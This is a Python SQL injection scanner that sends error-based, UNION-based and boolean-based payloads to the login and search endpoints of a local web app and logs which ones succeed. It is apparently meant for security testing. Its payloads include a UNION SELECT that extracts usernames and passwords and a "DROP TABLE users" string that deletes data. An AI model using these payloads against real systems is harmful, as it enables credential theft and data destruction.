#!/usr/bin/env python3
import requests
import time

class SQLiDetector:
    def __init__(self, base_url):
        self.base_url = base_url
        self.vulnerabilities = []

    def test_error_based_sqli(self):
        payloads = ["'", "' OR '1'='1", "admin'--", "'; DROP TABLE users;--"]
        for payload in payloads:
            r = requests.post(
                f"{self.base_url}/login",
                data={"username": payload, "password": "test"}
            )
            if "syntax" in r.text.lower() or "error" in r.text.lower():
                self.vulnerabilities.append(("Error-Based", payload))
            time.sleep(0.5)

    def test_union_based_sqli(self):
        payloads = [
            "' UNION SELECT username,password,email FROM users--"
        ]
        for payload in payloads:
            r = requests.get(f"{self.base_url}/search", params={"query": payload})
            if "@" in r.text:
                self.vulnerabilities.append(("Union-Based", payload))

    def test_boolean_based_sqli(self):
        true_payload = "' OR '1'='1"
        false_payload = "' OR '1'='2"

        r1 = requests.post(f"{self.base_url}/login",
                           data={"username": true_payload, "password": "x"})
        r2 = requests.post(f"{self.base_url}/login",
                           data={"username": false_payload, "password": "x"})

        if len(r1.text) != len(r2.text):
            self.vulnerabilities.append(("Boolean-Based", true_payload))

    def run_full_scan(self):
        self.test_error_based_sqli()
        self.test_union_based_sqli()
        self.test_boolean_based_sqli()
        self.generate_report()

    def generate_report(self):
        with open("sqli_report.txt", "w") as f:
            for v in self.vulnerabilities:
                f.write(f"{v[0]} SQLi detected using payload: {v[1]}\n")

def main():
    detector = SQLiDetector("http://localhost:5000")
    detector.run_full_scan()
    print("Scan complete. See sqli_report.txt")

if __name__ == "__main__":
    main()
